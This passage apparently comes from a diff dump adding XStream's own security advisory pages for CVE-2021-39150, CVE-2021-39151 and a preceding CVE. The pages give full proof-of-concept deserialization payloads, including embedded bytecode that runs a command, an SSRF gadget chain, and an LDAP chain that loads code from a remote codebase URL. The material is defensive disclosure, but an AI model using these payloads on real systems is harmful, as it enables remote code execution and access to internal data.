          "58:                       &lt;byte-array&gt;yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAbeXNvc2VyaWFsL1B3bmVyNjMzNTA1NjA2NTkzAQAdTHlzb3NlcmlhbC9Qd25lcjYzMzUwNTYwNjU5MzsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAk=&lt;/byte-array&gt;",
          "59:                       &lt;byte-array&gt;yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ&lt;/byte-array&gt;",
          "60:                     &lt;/__bytecodes&gt;",
          "61:                     &lt;__transletIndex&gt;-1&lt;/__transletIndex&gt;",
          "62:                     &lt;__indentNumber&gt;0&lt;/__indentNumber&gt;",
          "63:                   &lt;/default&gt;",
          "64:                 &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;",
          "65:               &lt;/proxy&gt;",
          "66:               &lt;implementing__method&gt;",
          "67:                 &lt;class&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/class&gt;",
          "68:                 &lt;name&gt;getOutputProperties&lt;/name&gt;",
          "69:                 &lt;parameter-types/&gt;",
          "70:               &lt;/implementing__method&gt;",
          "71:             &lt;/sun.tracing.dtrace.DTraceProbe&gt;",
          "72:           &lt;/entry&gt;",
          "73:         &lt;/probes&gt;",
          "74:       &lt;/defaultHandler&gt;",
          "75:     &lt;/handler&gt;",
          "76:   &lt;/dynamic-proxy&gt;",
          "77: &lt;/linked-hash-set&gt;",
          "78: </pre></div>",
          "79: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "80: xstream.fromXML(xml);",
          "81: </pre></div>",
          "83:     <p>As soon as the XML gets unmarshalled, the code from the payload gets executed on the host.</p>",
          "85:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "87:     <h2 id=\"impact\">Impact</h2>",
          "89:     <p>The vulnerability may allow a remote attacker to execute arbitrary code only by manipulating the processed",
          "90:     input stream.</p>",
          "92:     <h2 id=\"workarounds\">Workarounds</h2>",
          "94:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "96:     <h2 id=\"credits\">Credits</h2>",
          "98:     <p>Lai Han of NSFOCUS security team found and reported the issue to XStream and provided the required information",
          "99:     to reproduce it.</p>",
          "101:       </body>",
          "102:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-39150.html||xstream-distribution/src/content/CVE-2021-39150.html": [
          "File: xstream-distribution/src/content/CVE-2021-39150.html -> xstream-distribution/src/content/CVE-2021-39150.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 5. July 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39150</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-39150: A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams",
          "20:     from an arbitrary URL referencing a resource in an intranet or the local host.</p>",
          "22:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "24:     <p>All versions until and including version 1.4.17 are affected, if using the version out of the box with Java",
          "25:     runtime version 14 to 8. No user is affected, who followed the recommendation to setup",
          "26:     <a href=\"security.html#framework\">XStream's security framework</a> with a whitelist limited to the minimal",
          "27:     required types.</p>",
          "29:     <h2 id=\"description\">Description</h2>",
          "31:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "32:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "33:     input stream and replace or inject objects, that result in a server-side forgery request.</p>",
          "35:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "37:     <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "38:     unmarshal it again with XStream:</p>",
          "39: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "40:   &lt;unserializable-parents/&gt;",
          "41:   &lt;java.util.PriorityQueue&gt;",
          "42:     &lt;default&gt;",
          "43:       &lt;size&gt;2&lt;/size&gt;",
          "44:     &lt;/default&gt;",
          "45:     &lt;int&gt;3&lt;/int&gt;",
          "46:     &lt;dynamic-proxy&gt;",
          "47:       &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;",
          "48:       &lt;handler class='com.sun.xml.internal.ws.client.sei.SEIStub'&gt;",
          "49:         &lt;owner/&gt;",
          "50:         &lt;managedObjectManagerClosed&gt;false&lt;/managedObjectManagerClosed&gt;",
          "51:         &lt;databinding class='com.sun.xml.internal.ws.db.DatabindingImpl'&gt;",
          "52:           &lt;stubHandlers&gt;",
          "53:             &lt;entry&gt;",
          "54:               &lt;method&gt;",
          "55:                 &lt;class&gt;java.lang.Comparable&lt;/class&gt;",
          "56:                 &lt;name&gt;compareTo&lt;/name&gt;",
          "57:                 &lt;parameter-types&gt;",
          "58:                   &lt;class&gt;java.lang.Object&lt;/class&gt;",
          "59:                 &lt;/parameter-types&gt;",
          "60:               &lt;/method&gt;",
          "61:               &lt;com.sun.xml.internal.ws.client.sei.StubHandler&gt;",
          "62:                 &lt;bodyBuilder class='com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit'&gt;",
          "63:                   &lt;indices&gt;",
          "64:                     &lt;int&gt;0&lt;/int&gt;",
          "65:                   &lt;/indices&gt;",
          "66:                   &lt;getters&gt;",
          "67:                     &lt;com.sun.xml.internal.ws.client.sei.ValueGetter&gt;PLAIN&lt;/com.sun.xml.internal.ws.client.sei.ValueGetter&gt;",
          "68:                   &lt;/getters&gt;",
          "69:                   &lt;accessors&gt;",
          "70:                     &lt;com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;",
          "71:                       &lt;val_-isJAXBElement&gt;false&lt;/val_-isJAXBElement&gt;",
          "72:                       &lt;val_-getter class='com.sun.xml.internal.ws.spi.db.FieldGetter'&gt;",
          "73:                         &lt;type&gt;int&lt;/type&gt;",
          "74:                         &lt;field&gt;",
          "75:                           &lt;name&gt;hash&lt;/name&gt;",
          "76:                           &lt;clazz&gt;java.lang.String&lt;/clazz&gt;",
          "77:                         &lt;/field&gt;",
          "78:                       &lt;/val_-getter&gt;",
          "79:                       &lt;val_-isListType&gt;false&lt;/val_-isListType&gt;",
          "80:                       &lt;val_-n&gt;",
          "81:                         &lt;namespaceURI/&gt;",
          "82:                         &lt;localPart&gt;hash&lt;/localPart&gt;",
          "83:                         &lt;prefix/&gt;",
          "84:                       &lt;/val_-n&gt;",
          "85:                       &lt;val_-setter class='com.sun.xml.internal.ws.spi.db.MethodSetter'&gt;",
          "86:                         &lt;type&gt;java.lang.String&lt;/type&gt;",
          "87:                         &lt;method&gt;",
          "88:                           &lt;class&gt;jdk.nashorn.internal.runtime.Source&lt;/class&gt;",
          "89:                           &lt;name&gt;readFully&lt;/name&gt;",
          "90:                           &lt;parameter-types&gt;",
          "91:                             &lt;class&gt;java.net.URL&lt;/class&gt;",
          "92:                           &lt;/parameter-types&gt;",
          "93:                         &lt;/method&gt;",
          "94:                       &lt;/val_-setter&gt;",
          "95:                       &lt;outer-class&gt;",
          "96:                         &lt;propertySetters&gt;",
          "97:                           &lt;entry&gt;",
          "98:                             &lt;string&gt;serialPersistentFields&lt;/string&gt;",
          "99:                             &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "100:                               &lt;type&gt;[Ljava.io.ObjectStreamField;&lt;/type&gt;",
          "101:                               &lt;field&gt;",
          "102:                                 &lt;name&gt;serialPersistentFields&lt;/name&gt;",
          "103:                                 &lt;clazz&gt;java.lang.String&lt;/clazz&gt;",
          "104:                               &lt;/field&gt;",
          "105:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "106:                           &lt;/entry&gt;",
          "107:                           &lt;entry&gt;",
          "108:                             &lt;string&gt;CASE_INSENSITIVE_ORDER&lt;/string&gt;",
          "109:                             &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "110:                               &lt;type&gt;java.util.Comparator&lt;/type&gt;",
          "111:                               &lt;field&gt;",
          "112:                                 &lt;name&gt;CASE_INSENSITIVE_ORDER&lt;/name&gt;",
          "113:                                 &lt;clazz&gt;java.lang.String&lt;/clazz&gt;",
          "114:                               &lt;/field&gt;",
          "115:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "116:                           &lt;/entry&gt;",
          "117:                           &lt;entry&gt;",
          "118:                             &lt;string&gt;serialVersionUID&lt;/string&gt;",
          "119:                             &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "120:                               &lt;type&gt;long&lt;/type&gt;",
          "121:                               &lt;field&gt;",
          "122:                                 &lt;name&gt;serialVersionUID&lt;/name&gt;",
          "123:                                 &lt;clazz&gt;java.lang.String&lt;/clazz&gt;",
          "124:                               &lt;/field&gt;",
          "125:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "126:                           &lt;/entry&gt;",
          "127:                           &lt;entry&gt;",
          "128:                             &lt;string&gt;value&lt;/string&gt;",
          "129:                             &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "130:                               &lt;type&gt;[C&lt;/type&gt;",
          "131:                               &lt;field&gt;",
          "132:                                 &lt;name&gt;value&lt;/name&gt;",
          "133:                                 &lt;clazz&gt;java.lang.String&lt;/clazz&gt;",
          "134:                               &lt;/field&gt;",
          "135:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "136:                           &lt;/entry&gt;",
          "137:                           &lt;entry&gt;",
          "138:                             &lt;string&gt;hash&lt;/string&gt;",
          "139:                             &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "140:                               &lt;type&gt;int&lt;/type&gt;",
          "141:                               &lt;field reference='../../../../../val_-getter/field'/&gt;",
          "142:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "143:                           &lt;/entry&gt;",
          "144:                         &lt;/propertySetters&gt;",
          "145:                         &lt;propertyGetters&gt;",
          "146:                           &lt;entry&gt;",
          "147:                             &lt;string&gt;serialPersistentFields&lt;/string&gt;",
          "148:                             &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "149:                               &lt;type&gt;[Ljava.io.ObjectStreamField;&lt;/type&gt;",
          "150:                               &lt;field reference='../../../../propertySetters/entry/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/&gt;",
          "151:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "152:                           &lt;/entry&gt;",
          "153:                           &lt;entry&gt;",
          "154:                             &lt;string&gt;CASE_INSENSITIVE_ORDER&lt;/string&gt;",
          "155:                             &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "156:                               &lt;type&gt;java.util.Comparator&lt;/type&gt;",
          "157:                               &lt;field reference='../../../../propertySetters/entry[2]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/&gt;",
          "158:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "159:                           &lt;/entry&gt;",
          "160:                           &lt;entry&gt;",
          "161:                             &lt;string&gt;serialVersionUID&lt;/string&gt;",
          "162:                             &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "163:                               &lt;type&gt;long&lt;/type&gt;",
          "164:                               &lt;field reference='../../../../propertySetters/entry[3]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/&gt;",
          "165:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "166:                           &lt;/entry&gt;",
          "167:                           &lt;entry&gt;",
          "168:                             &lt;string&gt;value&lt;/string&gt;",
          "169:                             &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "170:                               &lt;type&gt;[C&lt;/type&gt;",
          "171:                               &lt;field reference='../../../../propertySetters/entry[4]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/&gt;",
          "172:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "173:                           &lt;/entry&gt;",
          "174:                           &lt;entry&gt;",
          "175:                             &lt;string&gt;hash&lt;/string&gt;",
          "176:                             &lt;com.sun.xml.internal.ws.spi.db.FieldGetter reference='../../../../val_-getter'/&gt;",
          "177:                           &lt;/entry&gt;",
          "178:                         &lt;/propertyGetters&gt;",
          "179:                         &lt;elementLocalNameCollision&gt;false&lt;/elementLocalNameCollision&gt;",
          "180:                         &lt;contentClass&gt;java.lang.String&lt;/contentClass&gt;",
          "181:                         &lt;elementDeclaredTypes/&gt;",
          "182:                       &lt;/outer-class&gt;",
          "183:                     &lt;/com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;",
          "184:                   &lt;/accessors&gt;",
          "185:                   &lt;wrapper&gt;java.lang.Object&lt;/wrapper&gt;",
          "186:                   &lt;bindingContext class='com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper'/&gt;",
          "187:                   &lt;dynamicWrapper&gt;false&lt;/dynamicWrapper&gt;",
          "188:                 &lt;/bodyBuilder&gt;",
          "189:                 &lt;isOneWay&gt;false&lt;/isOneWay&gt;",
          "190:               &lt;/com.sun.xml.internal.ws.client.sei.StubHandler&gt;",
          "191:             &lt;/entry&gt;",
          "192:           &lt;/stubHandlers&gt;",
          "193:           &lt;clientConfig&gt;false&lt;/clientConfig&gt;",
          "194:         &lt;/databinding&gt;",
          "195:         &lt;methodHandlers&gt;",
          "196:           &lt;entry&gt;",
          "197:             &lt;method reference='../../../databinding/stubHandlers/entry/method'/&gt;",
          "198:             &lt;com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;",
          "199:               &lt;owner reference='../../../..'/&gt;",
          "200:               &lt;method reference='../../../../databinding/stubHandlers/entry/method'/&gt;",
          "201:               &lt;isVoid&gt;false&lt;/isVoid&gt;",
          "202:               &lt;isOneway&gt;false&lt;/isOneway&gt;",
          "203:             &lt;/com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;",
          "204:           &lt;/entry&gt;",
          "205:         &lt;/methodHandlers&gt;",
          "206:       &lt;/handler&gt;",
          "207:     &lt;/dynamic-proxy&gt;",
          "208:     &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;",
          "209:   &lt;/java.util.PriorityQueue&gt;",
          "210: &lt;/java.util.PriorityQueue&gt;",
          "211: </pre></div>",
          "212: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "213: xstream.fromXML(xml);",
          "214: </pre></div>",
          "216:     <p>As soon as the XML gets unmarshalled, the payload gets executed and the data from the URL location is collected.</p>",
          "218:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "220:     <h2 id=\"impact\">Impact</h2>",
          "222:  <p>The vulnerability may allow a remote attacker to request data from internal resources that are not publicly",
          "223:  available only by manipulating the processed input stream.</p>",
          "225:     <h2 id=\"workarounds\">Workarounds</h2>",
          "227:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "229:     <h2 id=\"credits\">Credits</h2>",
          "231:     <p>Lai Han of NSFOCUS security team found and reported the issue to XStream and provided the required information",
          "232:     to reproduce it.</p>",
          "234:       </body>",
          "235:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-39151.html||xstream-distribution/src/content/CVE-2021-39151.html": [
          "File: xstream-distribution/src/content/CVE-2021-39151.html -> xstream-distribution/src/content/CVE-2021-39151.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 9. July 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39151</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-39151: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:     <p>All versions until and including version 1.4.17 are affected, if using the version out of the box.  No user is",
          "24:     affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security framework",
          "25:     </a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:     <p>Create an empty EventListenerList and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:     unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;javax.swing.event.EventListenerList serialization='custom'&gt;",
          "38:   &lt;javax.swing.event.EventListenerList&gt;",
          "39:     &lt;default&gt;",
          "40:       &lt;listenerList&gt;",
          "41:         &lt;javax.swing.undo.UndoManager&gt;",
          "42:           &lt;hasBeenDone&gt;true&lt;/hasBeenDone&gt;",
          "43:           &lt;alive&gt;true&lt;/alive&gt;",
          "44:           &lt;inProgress&gt;true&lt;/inProgress&gt;",
          "45:           &lt;edits&gt;",
          "46:             &lt;com.sun.xml.internal.ws.api.message.Packet&gt;",
          "47:               &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;",
          "48:                 &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;",
          "49:                 &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;",
          "50:                 &lt;bodyParts/&gt;",
          "51:                 &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;",
          "52:                   &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;",
          "53:                   &lt;multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'&gt;",
          "54:                     &lt;soapPart/&gt;",
          "55:                     &lt;mm&gt;",
          "56:                       &lt;it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;",
          "57:                         &lt;aliases class='com.sun.jndi.ldap.LdapBindingEnumeration'&gt;",
          "58:                           &lt;cleaned&gt;false&lt;/cleaned&gt;",
          "59:                           &lt;entries&gt;",
          "60:                             &lt;com.sun.jndi.ldap.LdapEntry&gt;",
          "61:                               &lt;DN&gt;cn=four,cn=three,cn=two,cn=one&lt;/DN&gt;",
          "62:                               &lt;attributes class='javax.naming.directory.BasicAttributes' serialization='custom'&gt;",
          "63:                                 &lt;javax.naming.directory.BasicAttribute&gt;",
          "64:                                   &lt;default&gt;",
          "65:                                     &lt;ignoreCase&gt;false&lt;/ignoreCase&gt;",
          "66:                                   &lt;/default&gt;",
          "67:                                   &lt;int&gt;4&lt;/int&gt;",
          "68:                                   &lt;com.sun.jndi.ldap.LdapAttribute serialization='custom'&gt;",
          "69:                                     &lt;javax.naming.directory.BasicAttribute&gt;",
          "70:                                       &lt;default&gt;",
          "71:                                         &lt;ordered&gt;false&lt;/ordered&gt;",
          "72:                                         &lt;attrID&gt;objectClass&lt;/attrID&gt;",
          "73:                                       &lt;/default&gt;",
          "74:                                       &lt;int&gt;1&lt;/int&gt;",
          "75:                                       &lt;string&gt;javanamingreference&lt;/string&gt;",
          "76:                                     &lt;/javax.naming.directory.BasicAttribute&gt;",
          "77:                                     &lt;com.sun.jndi.ldap.LdapAttribute&gt;",
          "78:                                       &lt;default&gt;",
          "79:                                         &lt;rdn class='com.sun.jndi.ldap.LdapName' serialization='custom'&gt;",
          "80:                                           &lt;com.sun.jndi.ldap.LdapName&gt;",
          "81:                                             &lt;string&gt;cn=four,cn=three,cn=two,cn=one&lt;/string&gt;",
          "82:                                             &lt;boolean&gt;false&lt;/boolean&gt;",
          "83:                                           &lt;/com.sun.jndi.ldap.LdapName&gt;",
          "84:                                         &lt;/rdn&gt;",
          "85:                                       &lt;/default&gt;",
          "86:                                     &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "87:                                   &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "88:                                   &lt;com.sun.jndi.ldap.LdapAttribute serialization='custom'&gt;",
          "89:                                     &lt;javax.naming.directory.BasicAttribute&gt;",
          "90:                                       &lt;default&gt;",
          "91:                                         &lt;ordered&gt;false&lt;/ordered&gt;",
          "92:                                         &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;",
          "93:                                       &lt;/default&gt;",
          "94:                                       &lt;int&gt;1&lt;/int&gt;",
          "95:                                       &lt;string&gt;http://127.0.0.1:8080/&lt;/string&gt;",
          "96:                                     &lt;/javax.naming.directory.BasicAttribute&gt;",
          "97:                                     &lt;com.sun.jndi.ldap.LdapAttribute&gt;",
          "98:                                       &lt;default/&gt;",
          "99:                                     &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "100:                                   &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "101:                                   &lt;com.sun.jndi.ldap.LdapAttribute serialization='custom'&gt;",
          "102:                                     &lt;javax.naming.directory.BasicAttribute&gt;",
          "103:                                       &lt;default&gt;",
          "104:                                         &lt;ordered&gt;false&lt;/ordered&gt;",
          "105:                                         &lt;attrID&gt;javaClassName&lt;/attrID&gt;",
          "106:                                       &lt;/default&gt;",
          "107:                                       &lt;int&gt;1&lt;/int&gt;",
          "108:                                       &lt;string&gt;refObj&lt;/string&gt;",
          "109:                                     &lt;/javax.naming.directory.BasicAttribute&gt;",
          "110:                                     &lt;com.sun.jndi.ldap.LdapAttribute&gt;",
          "111:                                       &lt;default/&gt;",
          "112:                                     &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "113:                                   &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "114:                                   &lt;com.sun.jndi.ldap.LdapAttribute serialization='custom'&gt;",
          "115:                                     &lt;javax.naming.directory.BasicAttribute&gt;",
          "116:                                       &lt;default&gt;",
          "117:                                         &lt;ordered&gt;false&lt;/ordered&gt;",
          "118:                                         &lt;attrID&gt;javaFactory&lt;/attrID&gt;",
          "119:                                       &lt;/default&gt;",
          "120:                                       &lt;int&gt;1&lt;/int&gt;",
          "121:                                       &lt;string&gt;ExecTemplateJDK7&lt;/string&gt;",
          "122:                                     &lt;/javax.naming.directory.BasicAttribute&gt;",
          "123:                                     &lt;com.sun.jndi.ldap.LdapAttribute&gt;",
          "124:                                       &lt;default/&gt;",
          "125:                                     &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "126:                                   &lt;/com.sun.jndi.ldap.LdapAttribute&gt;",
          "127:                                 &lt;/javax.naming.directory.BasicAttribute&gt;",
          "128:                               &lt;/attributes&gt;",
          "129:                             &lt;/com.sun.jndi.ldap.LdapEntry&gt;",
          "130:                           &lt;/entries&gt;",
          "131:                           &lt;limit&gt;2&lt;/limit&gt;",
          "132:                           &lt;posn&gt;0&lt;/posn&gt;",
          "133:                           &lt;homeCtx/&gt;",
          "134:                           &lt;more&gt;true&lt;/more&gt;",
          "135:                           &lt;hasMoreCalled&gt;true&lt;/hasMoreCalled&gt;",
          "136:                         &lt;/aliases&gt;",
          "137:                       &lt;/it&gt;",
          "138:                     &lt;/mm&gt;",
          "139:                   &lt;/multiPart&gt;",
          "140:                 &lt;/sm&gt;",
          "141:               &lt;/message&gt;",
          "142:             &lt;/com.sun.xml.internal.ws.api.message.Packet&gt;",
          "143:           &lt;/edits&gt;",
          "144:           &lt;indexOfNextAdd&gt;0&lt;/indexOfNextAdd&gt;",
          "145:           &lt;limit&gt;100&lt;/limit&gt;",
          "146:         &lt;/javax.swing.undo.UndoManager&gt;",
          "147:       &lt;/listenerList&gt;",
          "148:     &lt;/default&gt;",
          "149:     &lt;string&gt;java.lang.InternalError&lt;/string&gt;",
          "150:     &lt;javax.swing.undo.UndoManager reference='../default/listenerList/javax.swing.undo.UndoManager'/&gt;",
          "151:     &lt;null/&gt;",
          "152:   &lt;/javax.swing.event.EventListenerList&gt;",
          "153: &lt;/javax.swing.event.EventListenerList&gt;",
          "154: </pre></div>",
          "155: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
